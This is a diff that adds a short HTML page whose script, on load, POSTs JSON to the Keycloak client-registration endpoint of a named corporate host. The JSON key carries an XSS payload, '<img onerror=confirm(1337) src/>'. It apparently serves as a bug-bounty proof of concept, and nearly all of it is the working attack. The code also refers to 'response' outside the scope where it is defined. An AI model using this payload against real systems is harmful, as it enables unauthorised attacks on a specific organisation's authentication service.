@@ -1,0 +1,22 @@
+<html>
+	<script>
+		async function postData(){
+		var url = 'http://web-air-offers-rr.xp.latam.com/auth/realms/master/clients-registrations/openid-connect';
+		var data = {
+			  "<img onerror=confirm(1337) src/>":1,
+			}
+		const response = await fetch(url, {
+    	method: 'POST',
+    	headers: {
+      		'Content-Type': 'application/json'
+    	},
+    	redirect: 'follow', 
+    	referrerPolicy: 'no-referrer', 
+    	body: JSON.stringify(data) 
+  	});
+	}
+	postData();
+	console.log("I am running!")
+	console.log(response.json())
+	</script>
+</html>
